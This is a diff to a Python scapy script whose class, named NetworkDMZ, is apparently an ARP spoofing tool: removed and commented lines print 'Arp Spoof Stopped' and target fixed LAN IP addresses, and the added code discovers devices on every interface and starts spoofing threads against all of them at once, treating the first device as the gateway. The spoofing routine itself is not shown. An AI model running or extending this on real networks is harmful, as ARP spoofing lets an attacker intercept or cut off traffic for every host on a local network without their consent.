@@ -2,6 +2,8 @@ import scapy.all as scapy
 import time
 import threading
 
+from get_devices import devices_on_ifaces
+
 class NetworkDMZ():
 
     def __init__(self, gateway_ip) -> None:
@@ -9,6 +11,11 @@ class NetworkDMZ():
         self._terminate_dmz = None
         self.dmz_thread = None
         self.mac_cache = {}
+
+    def cache_macaddresses(self, device_list):
+
+        for ip, mac in device_list:
+            self.mac_cache[ip] = mac
 
     def get_mac(self, ip):
         arp_request = scapy.ARP(pdst = ip)
@@ -58,18 +65,30 @@ class NetworkDMZ():
     def start(self, target_ips, sleep = 2):
         self.dmz_thread = threading.Thread(target=self._start, args=(target_ips,sleep, ))
         self.dmz_thread.start()
-        self.dmz_thread.join()
+
     def stop(self):
         self._terminate_dmz = True
 
-target_ip = "192.168.132.249" # Enter your target IP
-gateway_ip = "192.168.132.42" # Enter your gateway's IP
 
-net_dmz = NetworkDMZ("192.168.132.42")
+dmzs = []
+
+for _, devices in devices_on_ifaces():
+    dmz = NetworkDMZ(devices[0][0])
+    dmz.cache_macaddresses(devices[1:])
+    ips = [x for x, _ in devices[1:]]
+    dmz.start(ips)
+    print("Started DMZ on network with gateway", dmz._gateway_ip)
+    dmzs.append(dmz)
   
-try:
-    net_dmz.start(["192.168.132.115", "192.168.132.124", "192.168.132.249"])
-except KeyboardInterrupt:
-    print("\nCtrl + C pressed.............Exiting")
-    net_dmz.stop()
-    print("[+] Arp Spoof Stopped")
+# try:
+#     net_dmz.start(["192.168.132.115", "192.168.132.124", "192.168.132.249"])
+# except KeyboardInterrupt:
+#     print("\nCtrl + C pressed.............Exiting")
+#     net_dmz.stop()
+#     print("[+] Arp Spoof Stopped")
+
+input("Press Enter to stop")
+
+for dmz in dmzs:
+    dmz.stop()
+    print("Stopped DMZ on network with gateway", dmz._gateway_ip)
